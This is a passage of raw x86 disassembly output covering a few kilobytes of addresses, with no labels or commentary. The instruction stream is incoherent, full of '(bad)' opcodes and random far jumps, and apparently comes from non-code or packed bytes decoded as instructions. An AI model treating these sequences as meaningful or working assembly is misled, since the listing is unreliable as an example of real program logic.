  408d61:	imul   ebp,DWORD PTR [ebp-0x11],0x32
  408d65:	lahf   
  408d66:	mov    ah,0xdf
  408d68:	mov    bl,0x25
  408d6a:	mov    edi,0xb6be59c4
  408d6f:	xlat   BYTE PTR ds:[ebx]
  408d70:	push   ss
  408d71:	lock (bad) 
  408d73:	mov    esi,0x878de5c7
  408d78:	and    edx,esi
  408d7a:	out    0x41,al
  408d7c:	xlat   BYTE PTR ds:[ebx]
  408d7d:	push   esp
  408d7e:	mov    eax,0xc42f9e8f
  408d83:	pop    ds
  408d84:	inc    ebp
  408d85:	xchg   ebp,eax
  408d86:	mov    al,ds:0x33330f2d
  408d8b:	mov    eax,ds:0x114501b4
  408d90:	fwait
  408d91:	mov    ecx,0x4988428f
  408d96:	jae    0x408dad
  408d98:	mov    BYTE PTR [edx+edx*2-0x3ec1b7c6],dl
  408d9f:	and    bl,ah
  408da1:	or     BYTE PTR [edx+edi*2],0xf5
  408da5:	xchg   ebx,eax
  408da6:	lahf   
  408da7:	repnz xor ebp,DWORD PTR [edi-0x5db7b7fd]
  408dae:	dec    eax
  408daf:	lahf   
  408db0:	mov    ch,0x75
  408db2:	cmp    BYTE PTR [ebp+0x4f0c021a],ah
  408db8:	gs mov ebx,0x24902892
  408dbe:	leave  
  408dbf:	pause  
  408dc1:	add    eax,0x66dcc413
  408dc6:	scas   al,BYTE PTR es:[edi]
  408dc7:	add    al,0x8c
  408dc9:	xchg   DWORD PTR [ecx],edx
  408dcb:	sub    al,0x7e
  408dcd:	jmp    0xd29a:0x1e912176
  408dd4:	mov    ch,0xc9
  408dd6:	mov    ds,WORD PTR [esi-0x60]
  408dd9:	add    ebp,DWORD PTR [eax+0x27f838e2]
  408ddf:	push   edi
  408de0:	push   edi
  408de1:	fmul   DWORD PTR [ebx+0x7]
  408de4:	stos   DWORD PTR es:[edi],eax
  408de5:	jne    0x408e22
  408de7:	int    0x62
  408de9:	test   DWORD PTR [eax+0x73],0xe16fd99c
  408df0:	xor    BYTE PTR [ebx+0x3f],cl
  408df3:	and    ebx,DWORD PTR [ecx-0x1a]
  408df6:	push   ebp
  408df7:	aam    0x27
  408df9:	push   0x6ccca129
  408dfe:	xchg   edx,eax
  408dff:	clc    
  408e00:	xchg   edi,eax
  408e01:	shl    esp,0xc8
  408e04:	inc    esi
  408e05:	call   DWORD PTR [edi+0x3a]
  408e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e09:	fwait
  408e0a:	es aas 
  408e0c:	mov    BYTE PTR [eax+edi*8+0x2b],0xb9
  408e11:	dec    esp
  408e12:	stc    
  408e13:	inc    ebx
  408e14:	sub    al,0x38
  408e16:	shr    dl,cl
  408e18:	sar    DWORD PTR [edx],0x47
  408e1b:	call   0xe958:0xaa300cb0
  408e22:	push   ss
  408e23:	add    BYTE PTR [ebp-0x6cbb6793],bl
  408e29:	lods   eax,DWORD PTR ds:[esi]
  408e2a:	mov    edx,0x70135a43
  408e2f:	fdivr  QWORD PTR [eax+0x4c89a46f]
  408e35:	stc    
  408e36:	mov    bl,BYTE PTR [ecx+0x6d]
  408e39:	ror    BYTE PTR [esi+0xd7e5786],cl
  408e3f:	adc    al,0x4e
  408e41:	jecxz  0x408ddf
  408e43:	lock pop ss
  408e45:	(bad)  
  408e46:	stc    
  408e47:	cmp    DWORD PTR [ecx-0x7c],eax
  408e4a:	and    ecx,0xffffff8c
  408e4d:	fidiv  DWORD PTR [ebx-0x7d]
  408e50:	call   0xc10c:0xa6e2a347
  408e57:	scas   eax,DWORD PTR es:[edi]
  408e58:	sbb    DWORD PTR [ebx-0x5a],esi
  408e5b:	inc    edx
  408e5c:	pop    ss
  408e5d:	mov    ch,0x73
  408e5f:	lock xor edx,eax
  408e62:	ja     0x408e6e
  408e64:	mov    ds:0x826c8409,al
  408e69:	lods   al,BYTE PTR ds:[esi]
  408e6a:	in     al,0xce
  408e6c:	les    ecx,FWORD PTR [esi+0x2014f16]
  408e72:	loopne 0x408e12
  408e74:	push   edi
  408e75:	sub    BYTE PTR [edx+0xb2c5300],cl
  408e7b:	xchg   esi,eax
  408e7c:	dec    ebx
  408e7d:	jmp    0x65f5:0x7c2ae03
  408e84:	jmp    0xede8d76f
  408e89:	mov    al,0x6e
  408e8b:	push   ss
  408e8c:	cwde   
  408e8d:	mov    cl,0x9b
  408e8f:	shl    DWORD PTR [ebp+0x40],0xc5
  408e93:	push   0x7e
  408e95:	rcl    DWORD PTR [edx-0x54],cl
  408e98:	cld    
  408e99:	sbb    ah,bl
  408e9b:	jae    0x408ef2
  408e9d:	repnz sbb esi,edx
  408ea0:	daa    
  408ea1:	mov    dl,0x32
  408ea3:	outs   dx,BYTE PTR ds:[esi]
  408ea4:	adc    BYTE PTR ds:0xecd06b64,al
  408eaa:	dec    ebx
  408eab:	and    DWORD PTR [ecx],edi
  408ead:	cwde   
  408eae:	out    dx,eax
  408eaf:	out    dx,eax
  408eb0:	ins    BYTE PTR es:[edi],dx
  408eb1:	lds    eax,FWORD PTR [ebx-0x4d]
  408eb4:	mov    edx,0x3878b662
  408eb9:	jg     0x408e42
  408ebb:	push   0x6
  408ebd:	stc    
  408ebe:	and    bh,dl
  408ec0:	int3   
  408ec1:	dec    edi
  408ec2:	hlt    
  408ec3:	add    ebp,ecx
  408ec5:	inc    ebx
  408ec6:	and    BYTE PTR [edx+0x512f5146],bl
  408ecc:	test   al,0xec
  408ece:	cmp    eax,0xeb29342d
  408ed3:	fisubr DWORD PTR [edi+0x2d]
  408ed6:	aaa    
  408ed7:	add    BYTE PTR [edi-0x80],al
  408eda:	push   edx
  408edb:	ja     0x408f35
  408edd:	in     al,dx
  408ede:	mov    bl,0xfb
  408ee0:	mov    ecx,0x232fba5b
  408ee5:	cmp    cl,BYTE PTR [ecx-0x16337ba5]
  408eeb:	call   0x8e88:0xfd5ca25
  408ef2:	sbb    eax,0x691f6ae7
  408ef7:	mov    ?,WORD PTR [ebx+ebp*2+0x1029f53f]
  408efe:	mov    bl,BYTE PTR [ebp-0x3b]
  408f01:	xchg   esi,eax
  408f02:	jbe    0x408f20
  408f04:	nop
  408f05:	in     eax,0x8f
  408f07:	mov    esi,DWORD PTR [esi-0x286f7a4d]
  408f0d:	jns    0x408eb4
  408f0f:	dec    ebp
  408f10:	xchg   ebx,eax
  408f11:	jge    0x408ecb
  408f13:	cmp    DWORD PTR [ecx-0x2fc11b4a],ebp
  408f19:	pop    eax
  408f1a:	rcl    DWORD PTR [edi+0x54],1
  408f1d:	push   0xfa57e568
  408f22:	jnp    0x408fa2
  408f24:	mov    edi,0xa9573e26
  408f29:	xor    al,0x7
  408f2b:	pop    ebp
  408f2c:	mov    cl,0xc9
  408f2e:	cwde   
  408f2f:	pop    ss
  408f30:	pop    es
  408f31:	fs (bad) 
  408f34:	jae    0x408f0c
  408f36:	lea    ebx,[ecx+ecx*2]
  408f39:	xor    BYTE PTR [esi*1+0x441ab85e],cl
  408f40:	jle    0x408f61
  408f42:	fcmovbe st,st(4)
  408f44:	arpl   cx,bx
  408f46:	mov    al,0x88
  408f48:	aam    0xab
  408f4a:	xchg   esi,eax
  408f4b:	std    
  408f4c:	mov    ds:0xfb54a915,eax
  408f51:	xor    DWORD PTR [edi+0x2c],ebp
  408f54:	xor    ch,bl
  408f56:	sub    eax,0xf072cf11
  408f5b:	int3   
  408f5c:	test   BYTE PTR [esi-0x5b9caf88],bl
  408f62:	or     esp,DWORD PTR [edi+0x77]
  408f65:	and    eax,0xc9270ec9
  408f6a:	mov    esi,DWORD PTR [eax]
  408f6c:	lock jb 0x408f1c
  408f6f:	fstp   DWORD PTR [ebx-0x2a908b95]
  408f75:	push   esp
  408f76:	out    dx,eax
  408f77:	cmc    
  408f78:	pop    es
  408f79:	(bad)  
  408f7a:	xor    ah,BYTE PTR [eax+edx*4]
  408f7d:	ret    0xad80
  408f80:	out    0x70,eax
  408f82:	mov    ebx,DWORD PTR [ecx*8+0x4cc2e4aa]
  408f89:	dec    esp
  408f8a:	fnsave [eax-0x1ed4c45b]
  408f90:	ret    0x22bf
  408f93:	out    dx,eax
  408f94:	or     eax,0x2bd3a722
  408f99:	add    esi,edi
  408f9b:	test   DWORD PTR [ecx-0x55],ebp
  408f9e:	je     0x408fb8
  408fa0:	cli    
  408fa1:	mov    cl,0xb7
  408fa3:	mov    ecx,edx
  408fa5:	or     eax,0x51f9e26b
  408faa:	call   0x3e80:0x7e8235fc
  408fb1:	dec    edi
  408fb2:	xor    ah,BYTE PTR [ebp-0x40d7f1bb]
  408fb8:	into   
  408fb9:	shl    DWORD PTR [eax-0x4c1ecfa0],0x9b
  408fc0:	or     eax,0x4f761621
  408fc5:	rcl    ebp,cl
  408fc7:	xchg   ecx,eax
  408fc8:	mov    ds:0xe0696a2,al
  408fcd:	aad    0x7b
  408fcf:	jmp    0xc651ecd0
  408fd4:	call   edx
  408fd6:	xor    DWORD PTR [ebx-0x1c],ebx
  408fd9:	(bad)  
  408fdb:	xor    al,0x8f
  408fdd:	push   0xcecc3f5d
  408fe2:	cdq    
  408fe3:	mov    edi,0xb77692ff
  408fe8:	push   edi
  408fe9:	mov    edi,0xcfb53c07
  408fef:	(bad)  
  408ff0:	mov    eax,ecx
  408ff2:	pop    es
  408ff3:	fs es dec eax
  408ff6:	mov    edi,0xffad6f83
  408ffb:	sar    bl,1
  408ffd:	mov    ah,0x64
  408fff:	(bad)  
  409000:	and    BYTE PTR [esi-0x43],bh
  409003:	mov    eax,0xb8845c82
  409008:	std    
  409009:	inc    edx
  40900a:	stos   DWORD PTR es:[edi],eax
  40900b:	ja     0x408fb0
  40900d:	cmp    eax,0xcffa3a22
  409012:	loop   0x40901e
  409014:	call   0xc6eea97f
  409019:	add    edx,DWORD PTR ds:0x581dec7f
  40901f:	inc    edi
  409020:	retf   0x7737
  409023:	outs   dx,BYTE PTR ds:[esi]
  409024:	add    edi,ebx
  409026:	adc    BYTE PTR [ebp+0x1a],bh
  409029:	cwde   
  40902a:	in     eax,dx
  40902b:	or     al,0xf7
  40902d:	cmp    esp,DWORD PTR [edx+0x331be2e8]
  409033:	ficom  DWORD PTR [ebx-0x33]
  409036:	or     cl,al
  409038:	out    dx,eax
  409039:	imul   ecx,DWORD PTR [ebp+0x1519f89d],0x25
  409040:	cwde   
  409041:	into   
  409042:	push   ebp
  409043:	es adc dl,ah
  409046:	xor    edi,DWORD PTR [ecx-0x3b]
  409049:	mov    esp,0x94d1363b
  40904e:	call   0xa709:0x6a22957d
  409055:	fsub   DWORD PTR [ecx]
  409057:	sbb    DWORD PTR [ecx+eiz*4-0x20cad7de],ebp
  40905e:	xchg   BYTE PTR [edx],bh
  409060:	xor    eax,0x95af2e91
  409065:	xchg   ebp,eax
  409066:	mov    dh,0xb9
  409068:	hlt    
  409069:	jmp    0xb347:0x1afec6bf
  409070:	es dec eax
  409072:	add    al,0xc2
  409074:	data16 or al,BYTE PTR [edx+0x3a]
  409078:	adc    BYTE PTR [ebx],ah
  40907a:	or     ah,BYTE PTR gs:[eax+eax*1-0x1c99f988]
  409082:	out    0x5e,al
  409084:	pop    ss
  409085:	scas   eax,DWORD PTR es:[edi]
  409086:	jl     0x40900b
  409088:	adc    eax,0x666ee3e1
  40908d:	ficom  DWORD PTR [esi+ebp*2-0x70]
  409091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409092:	xor    cl,BYTE PTR [esi+0x61]
  409095:	add    edx,ecx
  409097:	repz inc ebp
  409099:	daa    
  40909a:	mov    al,0x58
  40909c:	xchg   DWORD PTR [eax+0x192d73a8],eax
  4090a2:	popf   
  4090a3:	push   es
  4090a4:	inc    ebx
  4090a5:	call   0xd28d4a69
  4090aa:	test   DWORD PTR [edi],edx
  4090ac:	pushf  
  4090ad:	dec    ebp
  4090ae:	test   al,0xac
  4090b0:	inc    ecx
  4090b1:	inc    eax
  4090b2:	fdivr  DWORD PTR [esi+0x1e]
  4090b5:	sbb    al,bl
  4090b7:	shr    DWORD PTR [ebx-0x1048cc9b],cl
  4090bd:	(bad)  
  4090be:	psadbw mm7,mm2
  4090c1:	jno    0x40909f
  4090c3:	test   al,0xaa
  4090c5:	shl    bh,0x34
  4090c8:	push   ebp
  4090c9:	retf   
  4090ca:	test   al,0x93
  4090cc:	mov    ah,0x19
  4090ce:	iret   
  4090cf:	std    
  4090d0:	or     eax,0xf73214ed
  4090d5:	ret    
  4090d6:	retf   
  4090d7:	enter  0x7002,0x2a
  4090db:	lds    ecx,FWORD PTR [ebx]
  4090dd:	add    esp,DWORD PTR [edi]
  4090df:	inc    eax
  4090e0:	push   ds
  4090e1:	(bad)  
  4090e2:	test   BYTE PTR [edx+0x62],dh
  4090e5:	loop   0x4090d2
  4090e7:	test   BYTE PTR [edi-0x342bae01],bl
  4090ed:	hlt    
  4090ee:	hlt    
  4090ef:	inc    esi
  4090f0:	in     eax,0xfb
  4090f2:	out    dx,eax
  4090f3:	push   ebp
  4090f4:	cmp    DWORD PTR [esi],ecx
  4090f6:	pushf  
  4090f7:	cmc    
  4090f8:	cmp    ch,BYTE PTR [edi]
  4090fa:	out    0xcf,al
  4090fc:	or     DWORD PTR [esi+0x68],eax
  4090ff:	dec    DWORD PTR [ecx]
  409101:	push   ecx
  409102:	jnp    0x40909c
  409104:	sar    BYTE PTR [eax+ebp*2],cl
  409107:	push   ss
  409108:	pop    ebp
  409109:	sbb    esp,DWORD PTR [edi+0x1dc5091a]
  40910f:	cdq    
  409110:	mov    eax,ds:0xb1fbfc48
  409115:	retf   
  409116:	lods   al,BYTE PTR ds:[esi]
  409117:	sub    al,0x79
  409119:	sub    eax,0xda9920c8
  40911e:	pop    ds
  40911f:	or     DWORD PTR [eax+0x29ffd459],ebp
  409125:	mov    al,ds:0x4b7984eb
  40912a:	not    ch
  40912c:	jne    0x409193
  40912e:	ins    DWORD PTR es:[edi],dx
  40912f:	lods   eax,DWORD PTR ds:[esi]
  409130:	adc    al,0xaf
  409132:	sti    
  409133:	inc    edi
  409134:	jo     0x409121
  409136:	stos   BYTE PTR es:[edi],al
  409137:	sbb    DWORD PTR [esi+esi*1+0x6],esp
  40913b:	fdivr  st(4),st
  40913d:	push   esi
  40913e:	out    0xeb,al
  409140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409141:	or     bl,BYTE PTR [ebp-0x203eaeff]
  409147:	hlt    
  409148:	xchg   ebp,eax
  409149:	cmp    bh,ch
  40914b:	mov    edx,ecx
  40914d:	daa    
  40914e:	arpl   dx,di
  409150:	arpl   ax,dx
  409152:	mov    eax,0x9514d08
  409157:	jns    0x409129
  409159:	fst    DWORD PTR [ebp+esi*8-0x5142bf56]
  409160:	pushf  
  409161:	sbb    eax,0x1b2782d5
  409166:	ss pushf 
  409168:	dec    edi
  409169:	jns    0x4090f7
  40916b:	shl    DWORD PTR [esi-0x6bfbe6ea],0x2f
  409172:	jno    0x4091c3
  409174:	imul   ebx,DWORD PTR [esi+0x6911e68b],0x4b03adb9
  40917e:	xor    ebp,edx
  409180:	pop    edx
  409181:	aam    0xf7
  409183:	add    eax,0xa655ac9f
  409188:	xchg   ecx,eax
  409189:	jl     0x4091ea
  40918b:	pop    ebp
  40918c:	and    al,0xa9
  40918e:	or     BYTE PTR [edi],ch
  409190:	jb     0x40917d
  409192:	add    al,0x41
  409194:	ss int 0xd5
  409197:	retf   0x1b5c
  40919a:	outs   dx,BYTE PTR ds:[esi]
  40919b:	mov    ebx,0x7bf00a59
  4091a0:	imul   edx,DWORD PTR [edx-0xe519263],0xdd41d28b
  4091aa:	es push edx
  4091ac:	fisub  DWORD PTR [ebx+ebx*4]
  4091af:	mov    dl,0x2f
  4091b1:	xchg   edx,eax
  4091b2:	xchg   esp,eax
  4091b3:	mov    BYTE PTR [ebp-0x189384b6],bh
  4091b9:	out    0x85,eax
  4091bb:	sbb    ebp,DWORD PTR ds:0xf9fcce62
  4091c1:	xchg   ebp,eax
  4091c2:	adc    al,0x49
  4091c4:	xor    edi,edx
  4091c6:	mov    DWORD PTR [ebx],edi
  4091c8:	pop    esi
  4091c9:	xlat   BYTE PTR ds:[ebx]
  4091ca:	cmp    DWORD PTR [esi-0x1004bea6],ebp
  4091d0:	(bad)  
  4091d1:	les    edi,FWORD PTR [ebx+0x1a]
  4091d4:	lahf   
  4091d5:	dec    ebp
  4091d6:	rol    DWORD PTR [ebp-0x7d],cl
  4091d9:	in     eax,dx
  4091da:	in     eax,0x34
  4091dc:	cmp    cl,BYTE PTR [esi-0x48f73302]
  4091e2:	mov    cl,0x32
  4091e4:	scas   al,BYTE PTR es:[edi]
  4091e5:	lahf   
  4091e6:	test   BYTE PTR [eax],ch
  4091e8:	div    DWORD PTR [ecx-0x9]
  4091eb:	cmp    cl,bh
  4091ed:	and    DWORD PTR [ebx],0xffffffef
  4091f0:	sbb    dl,BYTE PTR [edi+eiz*2+0x62]
  4091f4:	mov    ebx,0x7478341b
  4091f9:	ficomp WORD PTR [edx+0x77754dc1]
  4091ff:	rcl    BYTE PTR [edi],0x47
  409202:	scas   eax,DWORD PTR es:[edi]
  409203:	mov    esi,0x5ee7e869
  409208:	dec    ecx
  409209:	jg     0x40928a
  40920b:	and    al,0x98
  40920d:	xor    ecx,ebx
  40920f:	add    BYTE PTR [edx+0x75ec0d03],al
  409215:	sahf   
  409216:	lods   al,BYTE PTR ds:[esi]
  409217:	jl     0x40925b
  409219:	add    BYTE PTR [ebx+0x55],bh
  40921c:	cwde   
  40921d:	inc    eax
  40921e:	lock (bad) 
  409220:	mov    eax,0x58bb5a7d
  409225:	(bad)  
  409226:	xor    ah,BYTE PTR [ebp+0x64f4c296]
  40922c:	and    ah,ah
  40922e:	sub    BYTE PTR [ecx+ebx*1+0x34],dh
  409232:	pusha  
  409233:	xchg   edi,eax
  409234:	sub    eax,edi
  409236:	int3   
  409237:	loopne 0x4091de
  409239:	mov    ?,WORD PTR [ebx-0x62]
  40923c:	push   ds
  40923d:	xchg   edx,eax
  40923e:	inc    edi
  40923f:	mov    ebp,esi
  409241:	retf   0xb3ad
  409244:	cwde   
  409245:	icebp  
  409246:	mov    cl,0x4a
  409248:	into   
  409249:	loope  0x4091e0
  40924b:	pop    ebx
  40924c:	dec    esp
  40924d:	pop    ds
  40924e:	and    DWORD PTR [ebx+0x2c],ebx
  409251:	cmp    eax,0x990fed35
  409256:	enter  0xa921,0xb0
  40925a:	leave  
  40925b:	xchg   edi,eax
  40925c:	leave  
  40925d:	cmp    eax,0x96bfaeab
  409262:	scas   eax,DWORD PTR es:[edi]
  409263:	push   edi
  409264:	xor    DWORD PTR [eax],ebp
  409266:	shl    DWORD PTR [edi+0x9],0xd3
  40926a:	push   ebx
  40926b:	push   ds
  40926c:	mov    al,0x6a
  40926e:	cld    
  40926f:	rol    DWORD PTR [ebx+0x392125ab],1
  409275:	mov    ah,0x2d
  409277:	mov    ebx,DWORD PTR [esi+eiz*4]
  40927a:	sub    edi,DWORD PTR [edi+0x66]
  40927d:	in     eax,0x20
  40927f:	frstor [edx+0x1f]
  409282:	shr    cl,cl
  409284:	xchg   ebx,eax
  409285:	sub    eax,0xbc0a2ab0
  40928a:	aad    0xce
  40928c:	mov    ch,0x57
  40928e:	sub    edi,ebp
  409290:	ja     0x40927d
  409292:	ja     0x4092d7
  409294:	and    al,0x1c
  409296:	mov    ah,0x31
  409298:	rcr    eax,1
  40929a:	mov    bl,0x8e
  40929d:	neg    DWORD PTR [edi+edx*2]
  4092a0:	addr16 xor al,0x8f
  4092a3:	and    eax,0x7fe219d2
  4092a8:	pop    eax
  4092a9:	or     BYTE PTR [eax+esi*4+0x5deec2b4],0xb2
  4092b1:	in     eax,0xa8
  4092b3:	test   al,0x88
  4092b5:	sbb    DWORD PTR [edx+0x392eb2fe],eax
  4092bb:	lods   eax,DWORD PTR ds:[esi]
  4092bc:	cmp    ecx,0xffffffa0
  4092bf:	or     ecx,edi
  4092c1:	sub    ch,BYTE PTR [edx]
  4092c3:	pop    ss
  4092c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c5:	(bad)  
  4092c6:	icebp  
  4092c7:	inc    esi
  4092c8:	push   edx
  4092c9:	mov    dl,0x6d
  4092cb:	rcr    DWORD PTR ds:0x345514ac,cl
  4092d1:	(bad)  
  4092d2:	(bad)  
  4092d3:	sbb    al,0xae
  4092d5:	or     dl,BYTE PTR [edi]
  4092d7:	jmp    0xb856:0xdfa90207
  4092de:	je     0x409304
  4092e0:	sub    DWORD PTR [edx-0x1f],edi
  4092e3:	xchg   ebx,eax
  4092e4:	shl    ebx,0x57
  4092e7:	push   esi
  4092e8:	or     al,0x50
  4092ea:	xlat   BYTE PTR ds:[ebx]
  4092eb:	pushf  
  4092ec:	sbb    DWORD PTR [eax+edx*1],edx
  4092ef:	adc    BYTE PTR [ebx],ch
  4092f1:	sbb    al,0x90
  4092f3:	ss pop ecx
  4092f5:	mov    esp,0x386e180c
  4092fa:	mov    esi,0x3bfd8580
  4092ff:	dec    esp
  409300:	ins    BYTE PTR es:[edi],dx
  409301:	jnp    0x409346
  409303:	jb     0x4092fc
  409305:	push   ss
  409306:	push   eax
  409307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409308:	hlt    
  409309:	mov    cl,0x7e
  40930b:	rcl    DWORD PTR ds:0xde821151,0x44
  409312:	dec    edx
  409313:	mov    ds:0x8c971d2c,eax
  409318:	fmulp  st(2),st
  40931a:	inc    edi
  40931b:	lahf   
  40931c:	and    al,0xc7
  40931e:	test   al,0x1a
  409320:	outs   dx,BYTE PTR ds:[esi]
  409321:	mov    esp,0x42f9996c
  409326:	jns    0x4092cc
  409328:	bound  esp,QWORD PTR [bx+si]
  40932b:	push   ebx
  40932c:	outs   dx,BYTE PTR ds:[esi]
  40932d:	mov    ebx,0x18c3eaa7
  409332:	out    0x34,al
  409334:	adc    esp,edi
  409336:	shl    eax,1
  409338:	aam    0x79
  40933a:	iret   
  40933b:	call   0xabb54353
  409340:	xchg   edi,eax
  409341:	rcr    esp,cl
  409343:	(bad)  
  409344:	sub    eax,0xe84abcfb
  409349:	adc    BYTE PTR [ecx+0x6c6fd758],0xd6
  409350:	xor    BYTE PTR [eax],bh
  409352:	sbb    BYTE PTR [edx],dh
  409354:	in     eax,0xe1
  409356:	dec    edx
  409357:	or     ax,0xb1c0
  40935b:	pusha  
  40935c:	mov    ds,WORD PTR [esi]
  40935e:	push   ebx
  40935f:	jno    0x409368
  409361:	pop    ss
  409362:	and    eax,0xd5074ec
  409367:	and    ebx,DWORD PTR ds:[ecx+0x1ed8b403]
  40936e:	jmp    0xa1e7:0x5a59a9f
  409375:	jl     0x4093a8
  409377:	push   0xffffffc4
  409379:	hlt    
  40937a:	sahf   
  40937b:	std    
  40937c:	xor    ecx,ebp
  40937e:	in     eax,0xe1
  409380:	or     eax,eax
  409382:	cmp    al,0xc0
  409384:	(bad)  
  409385:	retf   0x40fc
  409388:	pop    eax
  409389:	arpl   WORD PTR [ebx+0x76],sp
  40938c:	inc    edx
  40938d:	test   eax,0x47009f24
  409392:	cmp    edi,DWORD PTR [ebx+0x7c317a76]
  409398:	xor    eax,0x3a45f9dd
  40939d:	xlat   BYTE PTR ds:[ebx]
  40939e:	dec    edx
  40939f:	mov    ebp,DWORD PTR [ebx]
  4093a1:	inc    eax
  4093a2:	add    bh,BYTE PTR [ebp+0x3]
  4093a5:	sub    edx,esi
  4093a7:	arpl   WORD PTR [ecx-0x9],bx
  4093aa:	fld    TBYTE PTR [ebp+0x5de50e08]
  4093b0:	or     eax,0x69d5e2e
  4093b5:	pop    ebx
  4093b6:	pop    esp
  4093b7:	sub    al,bl
  4093b9:	xor    eax,0x9d6bcc59
  4093be:	aas    
  4093bf:	push   ds
  4093c0:	adc    BYTE PTR [esi+esi*8-0x39],0x24
  4093c5:	dec    esi
  4093c6:	xchg   cx,ax
  4093c8:	mov    ebp,0xe765f574
  4093cd:	jge    0x409448
  4093cf:	ds sti 
  4093d1:	scas   eax,DWORD PTR es:[edi]
  4093d2:	jg     0x409439
  4093d4:	jmp    eax
  4093d6:	cdq    
  4093d7:	dec    edi
  4093d8:	sbb    ch,BYTE PTR [ebp+0x10db00e2]
  4093de:	dec    edi
  4093df:	mov    edi,0xff0e2d97
  4093e5:	addr16 or al,0xea
  4093e8:	mov    eax,0x155632c2
  4093ed:	std    
  4093ee:	je     0x4093f6
  4093f0:	cld    
  4093f1:	xlat   BYTE PTR ds:[ebx]
  4093f2:	jbe    0x409397
  4093f4:	(bad)  
  4093f5:	ror    DWORD PTR [ecx-0x1a],cl
  4093f8:	cmp    eax,0x7f8906a
  4093fd:	js     0x409456
  4093ff:	aas    
  409400:	xchg   ebx,eax
  409401:	sub    edx,DWORD PTR [ebp-0x5f9df823]
  409407:	icebp  
  409408:	xchg   esi,eax
  409409:	xchg   ecx,eax
  40940a:	or     eax,0x289b12da
  40940f:	shl    ebx,0x52
  409412:	xchg   esi,eax
  409413:	rcr    BYTE PTR [edi],1
  409415:	popa   
  409416:	mov    esp,0x1b205bd
  40941b:	div    DWORD PTR [ecx+0x64046e8d]
  409421:	or     al,0x59
  409423:	pop    eax
  409424:	inc    eax
  409425:	sbb    cl,BYTE PTR [ecx-0x7b]
  409428:	adc    DWORD PTR [edi-0x36],eax
  40942b:	mov    ebx,0x64838e34
  409430:	mov    ?,ecx
  409432:	xchg   ecx,eax
  409433:	mov    ch,0xfd
  409435:	jnp    0x40940c
  409437:	ret    0xde1
  40943a:	loopne 0x409430
  40943c:	dec    ebx
  40943d:	(bad)  
  40943e:	xchg   ecx,eax
  40943f:	retf   
  409440:	cmp    DWORD PTR [edx],ecx
  409442:	mov    ch,0x32
  409444:	sub    DWORD PTR [edi+edx*1],esp
  409447:	jae    0x40941e
  409449:	adc    BYTE PTR ds:[edi-0x75b264ec],bh
  409450:	xchg   ecx,eax
  409451:	ror    BYTE PTR [ebp+0x5df24ca7],0xb0
  409458:	imul   edx,DWORD PTR [eax+ecx*1-0x2d],0x12
  40945d:	out    0x79,al
  40945f:	add    edx,DWORD PTR [edi]
  409461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409462:	in     eax,dx
  409463:	push   edi
  409464:	lea    ebx,[ecx-0x8a37263]
  40946a:	push   ebx
  40946b:	mov    edx,0xaf385e2e
  409470:	hlt    
  409471:	inc    ebp
  409472:	push   ebp
  409473:	mov    ds:0x41afc1a,eax
  409478:	xor    BYTE PTR [esi-0x26],dl
  40947b:	test   al,0x2
  40947d:	jp     0x409469
  40947f:	or     DWORD PTR [ebx+0x84921b],ebx
  409485:	(bad)  
  409486:	xchg   ebx,eax
  409487:	sar    eax,0x67
  40948a:	in     eax,dx
  40948b:	dec    eax
  40948c:	or     al,0x44
  40948e:	cmc    
  40948f:	(bad)  [eax-0x37]
  409492:	fldcw  WORD PTR [edx]
  409494:	xchg   BYTE PTR [eax-0x51d569fc],ah
  40949a:	js     0x4094b8
  40949c:	add    ah,ah
  40949e:	xchg   edi,eax
  40949f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094a0:	mov    bl,0x65
  4094a2:	sbb    BYTE PTR [ebp+0x75],bh
  4094a5:	dec    ebx
  4094a6:	push   eax
  4094a7:	jmp    0x9d95:0x12e88deb
  4094ae:	ins    BYTE PTR es:[edi],dx
  4094af:	sbb    eax,0x30add214
  4094b4:	clc    
  4094b5:	aad    0x93
  4094b7:	adc    ch,BYTE PTR [esi+0x1c]
  4094ba:	into   
  4094bb:	sbb    eax,0xfb3d99b8
  4094c0:	pop    edx
  4094c1:	xor    al,0xfa
  4094c3:	sti    
  4094c4:	cld    
  4094c5:	jecxz  0x4094b6
  4094c7:	pop    esi
  4094c8:	mov    ds:0x68466d24,al
  4094cd:	mov    dl,0x6a
  4094cf:	fs cdq 
  4094d1:	out    dx,al
  4094d2:	mov    edi,0x1dfbb1b
  4094d8:	push   esi
  4094d9:	mov    edi,0x46c76762
  4094de:	push   edx
  4094df:	test   al,0x15
  4094e1:	out    dx,al
  4094e2:	dec    esp
  4094e3:	mov    eax,ds:0x4d92f421
  4094e8:	fcom   QWORD PTR ss:[ebp+0x596827c5]
  4094ef:	in     eax,0x67
  4094f1:	pop    edx
  4094f2:	ret    
  4094f3:	cmp    ah,dh
  4094f5:	pop    esi
  4094f6:	or     al,0xe6
  4094f8:	shr    esi,0xa8
  4094fb:	aas    
  4094fc:	or     DWORD PTR es:[esi],edi
  4094ff:	jecxz  0x4094d1
  409501:	repz and BYTE PTR [ebp+0x4718b2e5],ah
  409508:	adc    eax,0x7874b237
  40950d:	mov    bl,0xb6
  40950f:	add    ah,ch
  409511:	ins    BYTE PTR es:[edi],dx
  409512:	add    al,0x79
  409514:	and    BYTE PTR [ebx],0x45
  409517:	xchg   esp,eax
  409518:	jecxz  0x4094aa
  40951a:	fst    QWORD PTR [ecx+0x5ba1c515]
  409520:	and    al,0x74
  409522:	call   0x41b47ccb
  409527:	retf   
  409528:	ins    DWORD PTR es:[edi],dx
  409529:	cmp    bh,bl
  40952b:	outs   dx,BYTE PTR ds:[esi]
  40952c:	add    eax,ebp
  40952e:	and    al,BYTE PTR [edi+0x5d]
  409531:	in     eax,dx
  409532:	mov    ch,0x14
  409534:	aas    
  409535:	mov    cl,0xd5
  409537:	bound  edi,QWORD PTR [edx]
  409539:	jno    0x4094d7
  40953b:	pushf  
  40953c:	ds push edx
  40953e:	pop    esi
  40953f:	imul   ecx,eax,0xffffffd6
  409542:	push   ebx
  409543:	jl     0x409594
  409545:	mov    edi,0x6f08cc47
  40954a:	iret   
  40954b:	pop    ebx
  40954c:	or     dl,0x27
  40954f:	dec    esp
  409550:	mov    eax,ds:0x7ab3da18
